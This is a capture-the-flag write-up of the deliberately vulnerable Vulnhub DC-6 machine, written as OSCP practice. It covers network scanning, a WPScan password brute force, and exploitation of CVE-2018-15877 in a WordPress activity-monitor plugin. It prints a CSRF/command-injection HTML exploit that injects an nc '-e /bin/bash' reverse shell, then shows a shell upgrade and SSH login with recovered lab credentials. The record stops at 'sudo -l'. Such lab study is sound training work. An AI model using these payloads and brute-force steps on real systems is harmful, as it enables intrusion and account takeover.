---
title: Write-up DC6 on Vulnhub
author: eMVee
date: 2023-03-30 20:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, OSCP]
render_with_liquid: false
---

Practice practice and practice again. Preparing for OSCP involves theory, but also a lot of practice. In the past few days I started the DC series again.
A number of DC machines are on the well-known TJnull list, so that is why I want to hack all the machines from this series. The machine can be downloaded from [Vulnhub](https://www.vulnhub.com/entry/dc-6,315/). After downloading the virtual machine, you have to configure the machine so it is on the same network as your Kali machine.

## Getting started
First create a working directory for this Vulnhub machine.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub]
└─$ mcd DC-6
```
Now I would like to know my own IP address.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ myip    

    inet 127.0.0.1
    inet 10.0.2.15

```
Since I know my IP address it is time to identify other IP addresses in my virtual network. The first command I use is with fping.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.36
```
Another method to identify IP addresses on my network is with arp-scan. I normally use arp-scan as second method since the results could be different.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ sudo arp-scan --localnet        
[sudo] password for emvee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:e0:29:f9, IPv4: 10.0.2.15
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:45:23:77       PCS Systemtechnik GmbH
10.0.2.36       08:00:27:59:72:45       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.8: 256 hosts scanned in 2.027 seconds (126.30 hosts/sec). 4 responded
```
There is a new IP address in my virtual network. Now let's create a variable called `ip` which has the IP address of the target assigned.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ ip=10.0.2.36
```


## Enumeration
Let's start to enumerate and perform a basic port scan with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ nmap -sC -p- $ip -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 19:03 CEST
Nmap scan report for 10.0.2.36
Host is up (0.00018s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 3e52cece01b694eb7b037dbe087f5ffd (RSA)
|   256 3c836571dd73d723f8830de346bcb56f (ECDSA)
|_  256 41899e85ae305be08fa4687106b415ee (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://wordy/

Nmap done: 1 IP address (1 host up) scanned in 3.50 seconds
```
It looks lik ethere are two ports open on the target:
* Port 22
	* SSH
* Port 80
	* HTTP
	* Redirect to http://wordy

Let's add `wordy` to our `/etc/hosts` file.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ sudo nano /etc/hosts

┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ cat /etc/hosts      
127.0.0.1       localhost
127.0.1.1       kali
10.0.2.36       wordy

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

Now let's run a more advanced port scan with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ sudo nmap -sC -sV -T4 -A -p- $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 19:06 CEST
Nmap scan report for wordy (10.0.2.36)
Host is up (0.00041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e52cece01b694eb7b037dbe087f5ffd (RSA)
|   256 3c836571dd73d723f8830de346bcb56f (ECDSA)
|_  256 41899e85ae305be08fa4687106b415ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-generator: WordPress 5.1.1
|_http-title: Wordy &#8211; Just another WordPress site
MAC Address: 08:00:27:59:72:45 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms wordy (10.0.2.36)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.33 seconds

```

In addition to the previous port scan a WordPress website have been identified by nmap. Now add the following to our notes:
* WordPress
	* WordPress version 5.1.1

Well, since we have some information found, it is not enough to attack. Let's enumerate more.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ whatweb http://$ip
http://10.0.2.36 [301 Moved Permanently] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.0.2.36], RedirectLocation[http://wordy/], UncommonHeaders[x-redirect-by]
http://wordy/ [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.0.2.36], JQuery[1.12.4], MetaGenerator[WordPress 5.1.1], PoweredBy[WordPress], Script[text/javascript], Title[Wordy &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.1.1] 
```
Whatweb discovered a lot of information, let's summerize it and add it to our notes.
* Linux, probably Debian
* Apache 2.4.25
* WordPress 5.1.1

Now let's use nikto to gather more information.
```bash 
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ nikto -h http://$ip 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.36
+ Target Hostname:    10.0.2.36
+ Target Port:        80
+ Start Time:         2023-03-27 19:12:04 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: http://wordy/
+ Uncommon header 'link' found, with multiple values: (<http://wordy/index.php/wp-json/>; rel="https://api.w.org/",<http://wordy/>; rel=shortlink,)
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login.php: Wordpress login found
+ 7915 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2023-03-27 19:13:11 (GMT2) (67 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Nikto found alogin page for WordPress, so add it to our notes:
* /wp-login.php

Since it is a WordPress website, we could use `wpscan` to gather some information about; themes, plugins and even users on the system.
Let's run it.
``` bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ wpscan --url http://wordy --enumerate u    
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
[+] URL: http://wordy/ [10.0.2.36]
[+] Started: Mon Mar 27 19:18:04 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://wordy/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordy/index.php/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |  - http://wordy/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://wordy/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] graham
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] mark
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] sarah
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] jens
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Mar 27 19:18:08 2023
[+] Requests Done: 31
[+] Cached Requests: 37
[+] Data Sent: 7.92 KB
[+] Data Received: 301.662 KB
[+] Memory used: 166.797 MB
[+] Elapsed time: 00:00:04

```


There are several users found:
 * Users
	 * admin
	 * graham
	 * mark
	 * sarah
	 * jens
 * Themes
	 * twentyseventeen version 3.1

Let's visit the website, to see if we can found any information what we could use in our attack.

![Image](/assets/img/WriteUp/Vulnhub/DC6/Pasted image 20230327192137.png){: width="700" height="400" }

So probably it has to do something with Plugins. Let's enumerate more information on the website.
![Image](/assets/img/WriteUp/Vulnhub/DC6/Pasted image 20230327192316.png){: width="700" height="400" }

It looks like `Jens Dagmeister` is the developer for the plugin.  Now enumerate more.

There was a hint on Vulnhub, so let's use it.
```
## Clue

OK, this isn't really a clue as such, but more of some "we don't want to spend five years waiting for a certain process to finish" kind of advice for those who just want to get on with the job.

cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt That should save you a few years. ;-)
```
Now create a new wordlist.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
```
Now create a user list, so we can brute force passwordxs against the known users with wpscan.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ nano users.txt

┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ cat users.txt                                                  
admin
graham
mark
sarah
jens

```
Now let's start wpscan to brute force those credentials.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ wpscan --url http://wordy --passwords passwords.txt --usernames users.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
[+] URL: http://wordy/ [10.0.2.36]
[+] Started: Mon Mar 27 19:37:35 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://wordy/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordy/index.php/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |  - http://wordy/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://wordy/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 5 user/s
[SUCCESS] - mark / helpdesk01                                                                                                                                                                                                              
Trying sarah / !lak019b Time: 00:03:38 <===============================================================================================================================                             > (12547 / 15215) 82.46%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: mark, Password: helpdesk01

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Mar 27 19:41:21 2023
[+] Requests Done: 12720
[+] Cached Requests: 5
[+] Data Sent: 6.222 MB
[+] Data Received: 7.739 MB
[+] Memory used: 299.957 MB
[+] Elapsed time: 00:03:46

```
So, we have found credentials for Mark
`mark:helpdesk01`

So let's signin with Mark in WordPress.
![Image](/assets/img/WriteUp/Vulnhub/DC6/Pasted image 20230327204711.png){: width="700" height="400" }

Enter the credentials and press `Log In`, wait for it.
![Image](/assets/img/WriteUp/Vulnhub/DC6/Pasted image 20230327204843.png){: width="700" height="400" }

We are in WordPress as Mark. Now let's see what we can do.
![Image](/assets/img/WriteUp/Vulnhub/DC6/Pasted image 20230327205236.png){: width="700" height="400" }

It looks like there is an activity monitor plugin available on this WordPress.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ searchsploit activity monitor plugin
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command In | php/webapps/45274.html
WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE | php/webapps/50110.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

It looks like there are some exploits available. But first we have to be sure this plugin is vulnerable.
Let's copy the Remote Code Execution exploit to our working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ searchsploit -m 50110               
  Exploit: WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2)
      URL: https://www.exploit-db.com/exploits/50110
     Path: /usr/share/exploitdb/exploits/php/webapps/50110.py
    Codes: CVE-2018-15877
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/emvee/Documents/Vulnhub/DC-6/50110.py

```
Now check the exploit and if it is okay, then run the exploit.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ python3 50110.py
What's your target IP?
10.0.2.36
What's your username?
mark
What's your password?
helpdesk01
[*] Please wait...
[*] Perfect! 
www-data@10.0.2.36  

```
It worked, we got a shell on the target.
```bash
www-data@10.0.2.36  whoami
www-data
www-data@10.0.2.36  hostname
dc-6

```
Now let's enumerate the Linux distro and kernel version.
```bash
www-data@10.0.2.36  uname -a
Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux
www-data@10.0.2.36  uname -mrs 
Linux 4.9.0-8-amd64 x86_64
www-data@10.0.2.36  cat /proc/version
Linux version 4.9.0-8-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.144-3.1 (2019-02-19)
www-data@10.0.2.36  cat /etc/issue
Debian GNU/Linux 9 \n \l
www-data@10.0.2.36  cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
www-data@10.0.2.36  lsb_release -a
Distributor ID: Debian
Description:    Debian GNU/Linux 9.8 (stretch)
Release:        9.8
Codename:       stretch

```

Now we have to check which users are on the system.
```bash
www-data@10.0.2.36  awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
Traceback (most recent call last):
  File "/home/emvee/Documents/Vulnhub/DC-6/50110.py", line 71, in <module>
    poc(ip)
  File "/home/emvee/Documents/Vulnhub/DC-6/50110.py", line 52, in poc
    exploit(soup.p.text, ip)
  File "/home/emvee/Documents/Vulnhub/DC-6/50110.py", line 41, in exploit
    html_doc = x.text.split("<p>Output from dig: </p>")[1]
               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^
IndexError: list index out of range

```
Oops, the shell crashed! Let's start another reverse shell from the first shell.
Okay, it did not work to setup another reverse shell, the first shell will crash.
There is another exploit available, let's check this one now.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ searchsploit activity monitor plugin
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection                                                                                                                  | php/webapps/45274.html
WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2)                                                                                                    | php/webapps/50110.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Now copy the first available exploit to our working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ searchsploit -m 45274               
  Exploit: WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection
      URL: https://www.exploit-db.com/exploits/45274
     Path: /usr/share/exploitdb/exploits/php/webapps/45274.html
    Codes: CVE-2018-15877
 Verified: True
File Type: HTML document, ASCII text
Copied to: /home/emvee/Documents/Vulnhub/DC-6/45274.html

```
Now inspect the exploit file.
```exploit
PoC:

-->

  

<html>

<!-- Wordpress Plainview Activity Monitor RCE

[+] Version: 20161228 and possibly prior

[+] Description: Combine OS Commanding and CSRF to get reverse shell

[+] Author: LydA(c)ric LEFEBVRE

[+] CVE-ID: CVE-2018-15877

[+] Usage: Replace 127.0.0.1 & 9999 with you ip and port to get reverse shell

[+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well

-->

<body>

<script>history.pushState('', '', '/')</script>

<form action="http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">

<input type="hidden" name="ip" value="google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash" />

<input type="hidden" name="lookup" value="Lookup" />

<input type="submit" value="Submit request" />

</form>

</body>

</html>
```
Well this looks pretty awesome as well... Let's change some settings and exploit it.
![Image](/assets/img/WriteUp/Vulnhub/DC6/Pasted image 20230327211806.png){: width="700" height="400" }


Save the changes and open the exploit. 
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ firefox 45274.html &                            
[1] 516249

```
The browser opens the exploit webpage. Before hitting the `submit` button, we have to start a netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ nc -lvp 9999   
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
```

![Image](/assets/img/WriteUp/Vulnhub/DC6/Pasted image 20230327211137.png){: width="700" height="400" }

Now we should hit the `submit` button.

## Initial access
Let's check the netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ nc -lvp 9999   
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.0.2.36.
Ncat: Connection from 10.0.2.36:55752.

```
We got a reverse shell, now we have to upgrade the shell.
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@dc-6:/var/www/html/wp-admin$ 
www-data@dc-6:/var/www/html/wp-admin$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
<l/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
www-data@dc-6:/var/www/html/wp-admin$ export TERM=xterm-256color  
export TERM=xterm-256color  
www-data@dc-6:/var/www/html/wp-admin$ alias ll='ls -lsaht --color=auto'  
alias ll='ls -lsaht --color=auto'  
```
We are almost there with upgrading the shell, we have to hit the `CTRL + Z` combination to put it in background.
```bash
www-data@dc-6:/var/www/html/wp-admin$ ^Z
zsh: suspended  nc -lvp 9999
```
Now we have to do our last steps in upgrading the shell.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ stty raw -echo ; fg ; reset  
[1]  + continued  nc -lvp 9999

www-data@dc-6:/var/www/html/wp-admin$ stty columns 200 rows 200
www-data@dc-6:/var/www/html/wp-admin$ 
```
So now we have a pseudo TTY. Let's continue with enumerating.
```bash
www-data@dc-6:/var/www/html/wp-admin$ awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
graham
mark
sarah
jens
www-data@dc-6:/var/www/html/wp-admin$ 

```

So there are dour users on the system:
* graham
* mark
* sarah
* jens

Let's find out if we can browse in their home directories.
```bash
www-data@dc-6:/var/www/html/wp-admin$ ls /home -ahlR
/home:
total 24K
drwxr-xr-x  6 root   root   4.0K Apr 26  2019 .
drwxr-xr-x 22 root   root   4.0K Apr 24  2019 ..
drwxr-xr-x  2 graham graham 4.0K Apr 26  2019 graham
drwxr-xr-x  2 jens   jens   4.0K Apr 26  2019 jens
drwxr-xr-x  3 mark   mark   4.0K Apr 26  2019 mark
drwxr-xr-x  2 sarah  sarah  4.0K Apr 24  2019 sarah

/home/graham:
total 24K
drwxr-xr-x 2 graham graham 4.0K Apr 26  2019 .
drwxr-xr-x 6 root   root   4.0K Apr 26  2019 ..
-rw------- 1 graham graham    5 Apr 26  2019 .bash_history
-rw-r--r-- 1 graham graham  220 Apr 24  2019 .bash_logout
-rw-r--r-- 1 graham graham 3.5K Apr 24  2019 .bashrc
-rw-r--r-- 1 graham graham  675 Apr 24  2019 .profile

/home/jens:
total 28K
drwxr-xr-x 2 jens jens 4.0K Apr 26  2019 .
drwxr-xr-x 6 root root 4.0K Apr 26  2019 ..
-rw------- 1 jens jens    5 Apr 26  2019 .bash_history
-rw-r--r-- 1 jens jens  220 Apr 24  2019 .bash_logout
-rw-r--r-- 1 jens jens 3.5K Apr 24  2019 .bashrc
-rw-r--r-- 1 jens jens  675 Apr 24  2019 .profile
-rwxrwxr-x 1 jens devs   50 Apr 26  2019 backups.sh

/home/mark:
total 28K
drwxr-xr-x 3 mark mark 4.0K Apr 26  2019 .
drwxr-xr-x 6 root root 4.0K Apr 26  2019 ..
-rw------- 1 mark mark    5 Apr 26  2019 .bash_history
-rw-r--r-- 1 mark mark  220 Apr 24  2019 .bash_logout
-rw-r--r-- 1 mark mark 3.5K Apr 24  2019 .bashrc
-rw-r--r-- 1 mark mark  675 Apr 24  2019 .profile
drwxr-xr-x 2 mark mark 4.0K Apr 26  2019 stuff

/home/mark/stuff:
total 12K
drwxr-xr-x 2 mark mark 4.0K Apr 26  2019 .
drwxr-xr-x 3 mark mark 4.0K Apr 26  2019 ..
-rw-r--r-- 1 mark mark  241 Apr 26  2019 things-to-do.txt

/home/sarah:
total 20K
drwxr-xr-x 2 sarah sarah 4.0K Apr 24  2019 .
drwxr-xr-x 6 root  root  4.0K Apr 26  2019 ..
-rw-r--r-- 1 sarah sarah  220 Apr 24  2019 .bash_logout
-rw-r--r-- 1 sarah sarah 3.5K Apr 24  2019 .bashrc
-rw-r--r-- 1 sarah sarah  675 Apr 24  2019 .profile

```

We can see some files.
* Mark
	* /home/mark/stuff
		* things-to-do.txt
			* Readable for everyone
* Jens
	* /home/jens
		* backups.sh
			* Read + Execute for everyone
			* Read, Write and Execute for members of 'devs' group


Let's check the to do file first.
```bash
www-data@dc-6:/var/www/html/wp-admin$ cat /home/mark/stuff/things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
www-data@dc-6:/var/www/html/wp-admin$ 

```
So probably we have a password for the user `Graham`. 
Add the following to our notes `graham:GSo7isUM1D4` .

Let's try to logon as Grahamvia SSH.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-6]
└─$ ssh graham@$ip       
The authenticity of host '10.0.2.36 (10.0.2.36)' can't be established.
ED25519 key fingerprint is SHA256:BiP2AT/3IPc02K9uqH+WQ7eaE/xcImEo/D1R6/0tjBw.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.36' (ED25519) to the list of known hosts.
graham@10.0.2.36's password: 
Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
graham@dc-6:~$ 

```

Yes we got in as Graham! Now let's find out what permissions we have.
```bash
graham@dc-6:~$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
